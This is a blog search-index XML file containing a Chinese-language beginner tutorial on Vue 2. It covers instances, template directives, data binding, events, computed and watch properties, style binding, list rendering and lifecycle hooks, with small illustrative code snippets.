<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Vue</title>
    <url>/2021/10/30/Vue/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="Vue-介绍"><a href="#Vue-介绍" class="headerlink" title="Vue - 介绍"></a>Vue - 介绍</h2><p>Vue (读音 &#x2F;vjuː&#x2F;，类似于 <strong>view</strong>) 是一套用于构建用户界面的<strong>渐进式框架</strong>。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">现代化的工具链</a>以及各种<a href="https://github.com/vuejs/awesome-vue#libraries--plugins">支持类库</a>结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。</p>
<p>后起之秀，生态完善，已然称为前端工程师必备技能。</p>
<h2 id="Vue-特点"><a href="#Vue-特点" class="headerlink" title="Vue - 特点"></a>Vue - 特点</h2><ol>
<li>声明式渲染</li>
<li>组件化模式</li>
<li>使用 虚拟 DOM + 优秀的 Diff 算法 ，高复用 DOM 节点</li>
</ol>
<h2 id="Vue-文档"><a href="#Vue-文档" class="headerlink" title="Vue - 文档"></a>Vue - 文档</h2><p><a href="https://vuejs.org/">官方网站</a></p>
<p><a href="https://cn.vuejs.org/">中文文档</a></p>
<h2 id="Vue-MVVM模型"><a href="#Vue-MVVM模型" class="headerlink" title="Vue - MVVM模型"></a>Vue - MVVM模型</h2><p>虽然没有完全遵循 <a href="https://zh.wikipedia.org/wiki/MVVM">MVVM 模型</a>，但是 Vue 的设计也受到了它的启发。因此在文档中经常会使用 <code>vm</code> (ViewModel 的缩写) 这个变量名表示 Vue 实例。</p>
<ol>
<li><em>M</em> - 模型（Model）：对应 data 中的数据</li>
<li><em>V</em> - 视图（View）：对应模板</li>
<li><em>VM</em> - 视图模型（ViewModel）：对应 Vue 实例对象</li>
</ol>
<img src="/2021/10/30/Vue/MVVM.png" class="" loading="lazy">

<h2 id="Vue-引入"><a href="#Vue-引入" class="headerlink" title="Vue - 引入"></a>Vue - 引入</h2><ol>
<li><p>通过 <script> 标签引入<strong>远程</strong> Vue.js</p>
<ul>
<li>对于制作原型或学习，你可以这样使用最新版本：</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>

<ul>
<li>对于生产环境，我们推荐链接到一个明确的版本号和构建文件，以避免新版本造成的不可预期的破坏：</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/vue@2.6.14"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>

<ul>
<li>如果你使用原生 ES Modules，这里也有一个兼容 ES Module 的构建文件：</li>
</ul>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"module"</span><span class="token operator">></span>
  <span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.esm.browser.js'</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
</li>
<li><p>通过 <script> 标签引入<strong>本地</strong> Vue.js</p>
<p><a href="https://cn.vuejs.org/js/vue.js">开发版本</a>包含完整的警告和调试模式</p>
<p><a href="https://cn.vuejs.org/js/vue.min.js">生产版本</a>删除了警告，33.46KB min+gzip</p>
</li>
<li><p>使用 NPM 安装</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 最新稳定版</span>
$ <span class="token function">npm</span> <span class="token function">install</span> vue</code></pre></li>
</ol>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h2 id="实例-创建一个-Vue-实例"><a href="#实例-创建一个-Vue-实例" class="headerlink" title="实例 - 创建一个 Vue 实例"></a>实例 - 创建一个 Vue 实例</h2><p>每个 Vue 应用都是通过用 <code>Vue</code> 函数创建一个新的 <strong>Vue 实例</strong>开始的：</p>
<p><strong>注意</strong>：Vue 实例所管理的函数<strong>不能用箭头函数</strong>，否则 this 指向的不是当前 vm 而是 window</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">var vm &#x3D; new Vue(&#123;
  el:&#39;#root&#39;,
  data:&#123;
      name:&#39;nayst&#39;
  &#125;,
  methods:&#123;
      method1()&#123;
          
      &#125;
  &#125;,
  ...
&#125;)</code></pre>

<p><code>el</code> 还可以利用<code>$mount</code>挂载到 vm 上：</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">var vm &#x3D; new Vue(&#123;
	
&#125;)
vm.$mount(&#39;#root&#39;)</code></pre>

<p><code>data</code>除了上述的对象式写法，还有一种常用的函数式写法：</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">var vm &#x3D; new Vue(&#123;
	data() &#123;
        return &#123;
            name:&#39;test&#39;
        &#125;
    &#125;
&#125;)</code></pre>

<p>在组件中，<code>data</code>必须使用_函数式_写法！</p>
<h2 id="实例-数据与方法"><a href="#实例-数据与方法" class="headerlink" title="实例 - 数据与方法"></a>实例 - 数据与方法</h2><p>当一个 Vue 实例被创建时，它将 <code>data</code> 对象中的所有的 property 加入到 Vue 的<strong>响应式系统</strong>中。当这些 property 的值发生改变时，视图将会产生“响应”，即匹配更新为新的值。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 我们的数据对象</span>
<span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span>

<span class="token comment">// 该对象被加入到一个 Vue 实例中</span>
<span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">data</span><span class="token operator">:</span> data
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token comment">// 获得这个实例上的 property</span>
<span class="token comment">// 返回源数据中对应的字段</span>
vm<span class="token punctuation">.</span>a <span class="token operator">==</span> data<span class="token punctuation">.</span>a <span class="token comment">// => true</span>

<span class="token comment">// 设置 property 也会影响到原始数据</span>
vm<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">2</span>
data<span class="token punctuation">.</span>a <span class="token comment">// => 2</span>

<span class="token comment">// ……反之亦然</span>
data<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">3</span>
vm<span class="token punctuation">.</span>a <span class="token comment">// => 3</span></code></pre>

<h2 id="实例-生命周期钩子"><a href="#实例-生命周期钩子" class="headerlink" title="实例 - 生命周期钩子"></a>实例 - 生命周期钩子</h2><p>每个 Vue 实例在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做<strong>生命周期钩子</strong>的函数，这给了用户在不同阶段添加自己的代码的机会。</p>
<p>例如 <code>created</code>钩子可以用来在一个实例被创建之后执行代码：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token function-variable function">created</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// `this` 指向 vm 实例</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a is: '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token comment">// => "a is: 1"</span></code></pre>

<h2 id="实例-生命周期图示"><a href="#实例-生命周期图示" class="headerlink" title="实例 - 生命周期图示"></a>实例 - 生命周期图示</h2><p>下图展示了实例的生命周期。你不需要立马弄明白所有的东西，不过随着你的不断学习和使用，它的参考价值会越来越高。</p>
<img src="/2021/10/30/Vue/lifecycle.png" class="" loading="lazy">

<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="模板语法-插值"><a href="#模板语法-插值" class="headerlink" title="模板语法 - 插值"></a>模板语法 - 插值</h2><p>插值语法用于解析标签体的内容，在双大括号之间加入 js 表达式。这种方式可以直接读取到<code>data</code>中的所有属性。</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">&lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;span&gt;</code></pre>

<p>对于所有的数据绑定，Vue.js 都提供了完全的 js 表达式支持。</p>
<pre class="language-vue" data-language="vue"><code class="language-vue">&#123;&#123; number + 1 &#125;&#125;

&#123;&#123; ok ? &#39;YES&#39; : &#39;NO&#39; &#125;&#125;

&#123;&#123; message.split(&#39;&#39;).reverse().join(&#39;&#39;) &#125;&#125;

&lt;div v-bind:id&#x3D;&quot;&#39;list-&#39; + id&quot;&gt;&lt;&#x2F;div&gt;</code></pre>

<h2 id="模板语法-指令"><a href="#模板语法-指令" class="headerlink" title="模板语法 - 指令"></a>模板语法 - 指令</h2><p>指令 (Directives) 是带有 <code>v-</code> 前缀的特殊 attribute。指令 attribute 的值预期是<strong>单个 JavaScript 表达式</strong> 。指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM。</p>
<p>例如，给标签绑定<code>v-if</code>指令，通过改变<code>seen</code>值的真假来 插入/移出 标签：</p>
<pre class="language-none"><code class="language-none">&lt;p v-if&#x3D;&quot;seen&quot;&gt;现在你看到我了&lt;&#x2F;p&gt;</code></pre>

<p>一些指令能够接收一个“参数”，在指令名称之后以冒号表示。例如，<code>v-bind</code> 指令可以用于响应式地更新 HTML attribute：</p>
<pre class="language-none"><code class="language-none">&lt;a v-bind:href&#x3D;&quot;url&quot;&gt;...&lt;&#x2F;a&gt;
&lt;!-- 可以简写成下面的形式 --&gt;
&lt;a :href&#x3D;&quot;url&quot;&gt;...&lt;&#x2F;a&gt;</code></pre>

<p>另一个例子是 <code>v-on</code> 指令，它用于监听 DOM 事件：</p>
<pre class="language-none"><code class="language-none">&lt;a v-on:click&#x3D;&quot;doSomething&quot;&gt;...&lt;&#x2F;a&gt;
&lt;!-- 可以简写成下面的形式 --&gt;
&lt;a @click&#x3D;&quot;doSomething&quot;&gt;...&lt;&#x2F;a&gt;</code></pre>

<h1 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h1><h2 id="数据-单向绑定"><a href="#数据-单向绑定" class="headerlink" title="数据 - 单向绑定"></a>数据 - 单向绑定</h2><p>通过<code>v-bind</code>完成对数据的单向绑定，数据只能从<code>data</code>流向页面。</p>
<pre class="language-none"><code class="language-none">&lt;div id&#x3D;&quot;root&quot;&gt;
    你原来的名字:&lt;input type&#x3D;&quot;text&quot; v-bind:value&#x3D;&quot;name&quot;&gt;
&lt;&#x2F;div&gt;</code></pre>

<h2 id="数据-双向绑定"><a href="#数据-双向绑定" class="headerlink" title="数据 - 双向绑定"></a>数据 - 双向绑定</h2><p>通过<code>v-model</code>完成对数据的双向绑定，数据可以从<code>data</code>流向页面，也可以从页面流向<code>data</code>。</p>
<pre class="language-none"><code class="language-none">&lt;div id&#x3D;&quot;root&quot;&gt;
    你要修改的名字:&lt;input type&#x3D;&quot;text&quot; v-model:value&#x3D;&quot;name&quot;&gt;
&lt;&#x2F;div&gt;</code></pre>

<p>注意：（1）双向绑定一般都应用在表单类元素上。</p>
<p> （2）v-model:value 可以简写为 v-model ，因为 v-model 默认接收 value</p>
<h2 id="数据-表单输入数据"><a href="#数据-表单输入数据" class="headerlink" title="数据 - 表单输入数据"></a>数据 - 表单输入数据</h2><p>你可以用 <code>v-model</code> 指令在表单 <code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code> 及 <code>&lt;select&gt;</code> 元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。</p>
<p>在<strong>文本框、多行文本、下拉框</strong>中，在 data 中绑定 value 即可：</p>
<pre class="language-none"><code class="language-none">&lt;form @submit.prevent&#x3D;&quot;demo&quot;&gt;
    &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;info.text&quot;&gt;
&lt;&#x2F;form&gt;</code></pre>

<p>在<strong>单选框</strong>中，需要绑定值，还要给标签配置 value ：</p>
<pre class="language-none"><code class="language-none">&lt;form @submit.prevent&#x3D;&quot;demo&quot;&gt;
    &lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;sex&quot; v-model&#x3D;&quot;info.sex&quot; value&#x3D;&quot;male&quot;&gt;man
    &lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;sex&quot; v-model&#x3D;&quot;info.sex&quot; value&#x3D;&quot;famale&quot;&gt;woman
&lt;&#x2F;form&gt;</code></pre>

<p>在<strong>复选框</strong>中，需要绑定值，还要给标签配置 value ，绑定的值要为一个_数组_：</p>
<pre class="language-none"><code class="language-none">&lt;form @submit.prevent&#x3D;&quot;demo&quot;&gt;
    &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;info.hobby&quot; value&#x3D;&quot;sing&quot;&gt;sing
    &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;info.hobby&quot; value&#x3D;&quot;dance&quot;&gt;dance
    &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;info.hobby&quot; value&#x3D;&quot;study&quot;&gt;study
&lt;&#x2F;form&gt;</code></pre>

<p>需要配置的 data ：</p>
<pre class="language-none"><code class="language-none">data:&#123;
    info:&#123;
    	text:&#39;&#39;,
        sex:&#39;famale&#39;,
        hobby:[]
    &#125;
&#125;</code></pre>

<h2 id="数据-数据代理"><a href="#数据-数据代理" class="headerlink" title="数据 - 数据代理"></a>数据 - 数据代理</h2><p>利用<code>Object.defineProperty(obj, prop, desc)</code> 操作数据，可以直接在一个对象上定义一个新属性，或者修改一个已经存在的属性。</p>
<ul>
<li><p>obj：需要定义属性的当前对象</p>
</li>
<li><p>prop：当前需要定义的属性名</p>
</li>
<li><p>desc：属性描述符</p>
</li>
</ul>
<p>基本用法：</p>
<pre class="language-none"><code class="language-none">let Person &#x3D; &#123;
    name:&#39;&#39;,
&#125;
Object.defineProperty(Person, &#39;name&#39;, &#123;
    value: &#39;jack&#39;,
    enumberable:true,&#x2F;&#x2F;是否可以枚举,默认为false
    writable: true,&#x2F;&#x2F; 是否可以改变,默认为false
    configurable: true,&#x2F;&#x2F;是否可以被删除,默认为false
&#125;)</code></pre>

<p>进阶用法：</p>
<pre class="language-none"><code class="language-none">let Person &#x3D; &#123;
    name:&#39;&#39;,
    age:&#39;&#39;,
&#125;
let number &#x3D; 19
Object.defineProperty(Person, &#39;age&#39;, &#123;
    get()&#123;
        return number
    &#125;,
    set(value)&#123;
        number &#x3D; value
    &#125;
&#125;</code></pre>

<blockquote>
<p>Vue 中的数据代理，是通过 vm 对象来代理 data 对象中的属性的操作（读/写）</p>
<p>Vue 中的数据代理的好处：更加方便的操作 data 中的数据</p>
<p>基本原理：通过 <code>Object.defineProperty</code> 把对象中的所有属性加到 vm 上，每一个属性都添加了对应的 getter/setter ，用于操作 data 中对应的属性</p>
</blockquote>
<h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><h2 id="事件-事件处理"><a href="#事件-事件处理" class="headerlink" title="事件 - 事件处理"></a>事件 - 事件处理</h2><p>可以用 <code>v-on</code> 指令监听 DOM 事件，并在触发时运行对应的代码。</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;buttom @click&#x3D;&quot;greet&quot;&gt;Greet&lt;&#x2F;buttom&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">methods:&#123;
    greet()&#123;
        alert(&#39;Hello&#39;)
    &#125;
&#125;</code></pre>

<blockquote>
<ul>
<li><p>事件的回调需要配置在 methods 中，最终在 vm 上</p>
</li>
<li><p>methods 中配置的函数，不能用箭头函数，否则 this 就不是 vm 了</p>
</li>
<li><p>methods 中配置的函数，都是被 Vue 所管理的函数，this 指向的是 vm 或 组件实例对象</p>
</li>
</ul>
</blockquote>
<h2 id="事件-事件修饰符"><a href="#事件-事件修饰符" class="headerlink" title="事件 - 事件修饰符"></a>事件 - 事件修饰符</h2><p>Vue.js 为 <code>v-on</code> 提供如下了<strong>事件修饰符</strong>，用于在处理事件时进行一些限制。</p>
<ol>
<li>prevent：阻止默认事件（常用）</li>
<li>stop：阻止事件冒泡（常用）</li>
<li>once：事件只触发一次（常用）</li>
<li>capture：使用事件的捕获模式，即内部元素触发的事件优先在此处理，然后才交由内部元素进行处理</li>
<li>self：只有 event.target 是当前操作的元素时才触发事件，即事件不是从内部元素触发的</li>
<li>passive：事件的默认行为立即执行，无需等待事件回调执行完毕</li>
</ol>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot; @click.prevent&#x3D;&quot;showInfo&quot;&gt;点我提示&lt;&#x2F;a&gt;
    &lt;!-- 修饰符可以串联 --&gt;
	&lt;a @click.stop.prevent&#x3D;&quot;doThat&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;div&gt;</code></pre>

<h2 id="事件-键盘事件"><a href="#事件-键盘事件" class="headerlink" title="事件 - 键盘事件"></a>事件 - 键盘事件</h2><p>Vue.js 中的键盘事件有 <code>keyup</code>（按下并抬起时触发）和 <code>keydown</code> （按下时触发），并且可以在触发时添加修饰符：_enter_（回车）、_delete_（删除）、_esc_（退出）、_space_（空格）、_tab_（换行）、_up_（上）、_down_（下）、_left_（左）、_down_（右）。</p>
<p>其余未提供别名的按键，可以使用按键原始的 key 值去绑定，利用 <strong>event.keyCode</strong> 获取按键编码。</p>
<p>系统修饰键 Ctrl、Alt、Shift、Meta 用法特殊，当搭配 keydown 使用的时候，正常按下即触发；当搭配 keyup 的时候，需要按下修饰键时同时按下任意其他键，释放后触发。</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keydown.ctrl&#x3D;&quot;showInfo&quot;&gt;
&lt;&#x2F;div&gt;</code></pre>

<h1 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h1><h2 id="属性-计算属性"><a href="#属性-计算属性" class="headerlink" title="属性 - 计算属性"></a>属性 - 计算属性</h2><p>模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让模板过重且难以维护。 Vue.js 中提供了_计算属性_，用于得到不存在的属性。例如：</p>
<pre class="language-none"><code class="language-none">&lt;div id&#x3D;&quot;root&quot;&gt;
    你的全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;&#x2F;span&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
    firstName:&#39;nayst&#39;,
    lastName:&#39;yang&#39;
&#125;
computed:&#123;
    fullName:&#123;
        &#x2F;&#x2F;当 fullName 被 读取 时调用 get
        get()&#123;
            console.log(&#39;get被调用了&#39;,this)
            return this.firstName + &#39;-&#39; + this.lastName
		&#125;,
        &#x2F;&#x2F;当 fullName 被 修改 时调用 set
        set(value)&#123;
            console.log(&#39;set&#39;,value)
        &#125;
    &#125;
&#125;</code></pre>

<p>当计算属性不需要<code>setter</code>修改时，可以简写成如下形式：</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;计算属性的简写
computed:&#123;
    fullName()&#123;
        console.log(&#39;get被调用了&#39;,this)
        return this.firstName + &#39;-&#39; + this.lastName
    &#125;
&#125;</code></pre>

<p>原理：底层借助了<code>Object.defineProperty</code>方法提供的 setter 和 getter</p>
<h2 id="属性-监视属性"><a href="#属性-监视属性" class="headerlink" title="属性 - 监视属性"></a>属性 - 监视属性</h2><p>虽然计算属性在大多数情况下更合适，但有时也需要一个自定义的侦听器。Vue 提供了一种更通用的方式来观察和响应 Vue 实例上的数据变动：<strong>监视属性</strong>。当需要在数据变化时执行异步或开销较大的操作时，这个方式是最有用的。例如：</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;请输入您的问题&quot; v-model&#x3D;&quot;question&quot;&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
	question:&#39;&#39;
&#125;,
watch:&#123;
    answer:&#123;
        immediate:true,&#x2F;&#x2F;在初始化时调用一次 handler
        &#x2F;&#x2F; handler 在 answer 改变时调用
		handler(newValue,oldValue)&#123;
            console.log(&#39;question被修改了，原来是&#39;,oldValue,&#39;，现在是&#39;,newValue)
        &#125;
    &#125;
&#125;</code></pre>

<p>还有另一种命令式的 API 写法：</p>
<pre class="language-none"><code class="language-none">vm.$watch(&#39;answer&#39;,&#123;
    handler(newValue,oldValue)&#123;
        console.log(&#39;question被修改了，原来是&#39;,oldValue,&#39;，现在是&#39;,newValue)
    &#125;
&#125;)</code></pre>

<p>当需要监视对_多级结构_中某个属性变化时，需要开启<strong>深度监视</strong>：</p>
<pre class="language-none"><code class="language-none">data:&#123;
	numbers:&#123;
        a:1,
        b:2
    &#125;
&#125;,
watch:&#123;
    numbers:&#123;
        deep:true&#x2F;&#x2F;是否开启深度监视
		handler(Value)&#123;
            console.log(&#39;question被修改了&#39;,Value)
        &#125;
    &#125;
&#125;</code></pre>

<p>当_监视属性_中只需要 handler 时，可以采用如下简写形式：</p>
<pre class="language-none"><code class="language-none">watch:&#123;
    answer(newValue,oldValue)&#123;
        console.log(&#39;question被修改了，原来是&#39;,oldValue,&#39;，现在是&#39;,newValue)
    &#125;
&#125;</code></pre>

<p>当然 API 写法也是可以简写的：</p>
<pre class="language-none"><code class="language-none">vm.$watch(&#39;answer&#39;,function(newValue,oldValue)&#123;
	console.log(&#39;question被修改了，原来是&#39;,oldValue,&#39;，现在是&#39;,newValue)
&#125;)</code></pre>

<h1 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h1><p>操作元素的 class 列表和内联样式是数据绑定的一个常见需求。因为它们都是 attribute，所以我们可以用 <code>v-bind</code> 处理它们：只需要通过表达式计算出字符串结果即可。不过，字符串拼接麻烦且易错。因此，在将 <code>v-bind</code> 用于 <code>class</code> 和 <code>style</code> 时，Vue.js 做了专门的增强。表达式结果的类型除了字符串之外，还可以是对象或数组</p>
<h2 id="绑定-Class样式"><a href="#绑定-Class样式" class="headerlink" title="绑定 - Class样式"></a>绑定 - Class样式</h2><p>我们可以传给 <code>v-bind:class</code> 一个字符串，以动态地切换 class：</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;div class&#x3D;&quot;basic&quot; :class&#x3D;&quot;class&quot;&gt;
        &lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;span&gt;
    &lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
    msg:&#39;This is a test.&#39;,
    class:&#39;className&#39;
&#125;</code></pre>

<p>同样的，我们也可以传_数组_和_对象_：</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;div class&#x3D;&quot;basic&quot; :class&#x3D;&quot;classArr&quot;&gt;
        &lt;span&gt;&#123;&#123; msg1 &#125;&#125;&lt;&#x2F;span&gt;
    &lt;&#x2F;div&gt;
    &lt;div class&#x3D;&quot;basic&quot; :class&#x3D;&quot;classObj&quot;&gt;
        &lt;span&gt;&#123;&#123; msg2 &#125;&#125;&lt;&#x2F;span&gt;
    &lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
    msg1:&#39;This is an array.&#39;,
    msg2:&#39;This is an object&#39;,
    classArr:[&#39;className1&#39;,&#39;className2&#39;,&#39;className3&#39;],
    classObj:&#123;
        className1:true,
        className2:false,
        className3:true
    &#125;
&#125;</code></pre>

<h2 id="绑定-Style样式"><a href="#绑定-Style样式" class="headerlink" title="绑定 - Style样式"></a>绑定 - Style样式</h2><p><code>v-bind:style</code> 的对象语法十分直观——看着非常像 CSS，但其实是一个 JavaScript 对象</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;div class&#x3D;&quot;basic&quot; :style&#x3D;&quot;styleObj&quot;&gt;
        &lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;span&gt;
    &lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
    msg:&#39;This is an object.&#39;,
    styleObj:&#123;
        fontsize: &#39;40px&#39;,
        color: &#39;red&#39;
    &#125;
&#125;</code></pre>

<p><code>v-bind:style</code> 的数组语法可以将多个样式对象应用到同一个元素上：</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;div class&#x3D;&quot;basic&quot; :style&#x3D;&quot;styleArr&quot;&gt;
        &lt;span&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;span&gt;
    &lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
    msg:&#39;This is an array.&#39;,
    styleObj:[
        &#123;
            fontsize: &#39;40px&#39;,
        	color: &#39;red&#39;
        &#125;,
        &#123;
            backgroundColor: &#39;gray&#39;
        &#125;
    ]
&#125;</code></pre>

<h1 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h1><h2 id="渲染-条件渲染"><a href="#渲染-条件渲染" class="headerlink" title="渲染 - 条件渲染"></a>渲染 - 条件渲染</h2><p><code>v-if</code> 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回 true 值的时候被渲染。<code>v-else-if</code>，顾名思义，充当 <code>v-if</code> 的“else-if 块”，可以连续使用。<code>v-else</code> 指令用于表示 <code>v-if</code> 的“else 块”</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;div v-if&#x3D;&quot;n&#x3D;&#x3D;&#x3D;1&quot;&gt;Angular&lt;&#x2F;div&gt;
    &lt;div v-else-if&#x3D;&quot;n&#x3D;&#x3D;&#x3D;2&quot;&gt;Vue&lt;&#x2F;div&gt;
    &lt;div v-else&gt;Wrong choice!&lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;</code></pre>

<p>另一个用于根据条件展示元素的选项是 <code>v-show</code> 指令。用法大致一样：</p>
<pre class="language-none"><code class="language-none">&lt;div&gt;
    &lt;div v-show&#x3D;&quot;false&quot;&gt;You can&#39;t see me&lt;&#x2F;div&gt;
    &lt;div v-show&#x3D;&quot;true&quot;&gt;You can see me&lt;&#x2F;div&gt;
&lt;&#x2F;div&gt;</code></pre>

<h2 id="渲染-列表渲染"><a href="#渲染-列表渲染" class="headerlink" title="渲染 - 列表渲染"></a>渲染 - 列表渲染</h2><p>我们可以用 <code>v-for</code> 指令基于一个_数组_来渲染一个列表。<code>v-for</code> 指令需要使用 <code>item in items</code> 形式的特殊语法，其中 <code>items</code> 是源数据数组，而 <code>item</code> 则是被迭代的数组元素的<strong>别名</strong></p>
<pre class="language-none"><code class="language-none">&lt;ul&gt;
    &lt;li v-for&#x3D;&quot;(person,index) in persons&quot; :key&#x3D;&quot;index&quot;&gt;
    	&#123;&#123;person.name&#125;&#125;-&#123;&#123;person.age&#125;&#125;
    &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
    persons:[
        &#123;id:&#39;01&#39;,name:&#39;Akko&#39;,age:&#39;18&#39;&#125;,
        &#123;id:&#39;02&#39;,name:&#39;Ashe&#39;,age:&#39;19&#39;&#125;,
        &#123;id:&#39;03&#39;,name:&#39;Luxa&#39;,age:&#39;20&#39;&#125;
    ]
&#125;</code></pre>

<p>你也可以用 <code>v-for</code> 来遍历一个_对象_的 property</p>
<pre class="language-none"><code class="language-none">&lt;ul&gt;
    &lt;li v-for&#x3D;&quot;(value,key) in cars&quot; :key&#x3D;&quot;key&quot;&gt;
    	&#123;&#123;key&#125;&#125;-&#123;&#123;value&#125;&#125;
    &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;</code></pre>
<pre class="language-none"><code class="language-none">data:&#123;
    cars:&#123;
        name:&#39;奥迪A8&#39;,
        price:&#39;800k&#39;,
        color:&#39;black&#39;
    &#125;
&#125;</code></pre>

<p><strong>注意</strong>：key 在循环中作为_唯一标识_，不写默认为_循环的索引_</p>
<h1 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h1><p>所有生命周期钩子的 <code>this</code> 上下文将自动绑定至实例中，因此你可以访问 data、computed 和 methods。这意味着<strong>你不应该使用箭头函数来定义一个生命周期方法</strong> (例如 <code>created: () =&gt; this.fetchTodos()</code>)。因为箭头函数绑定了父级上下文，所以 <code>this</code> 不会指向预期的组件实例，并且<code>this.fetchTodos</code> 将会是 undefined。</p>
<img src="/2021/10/30/Vue/lifecyclefunc.png" class="" loading="lazy">

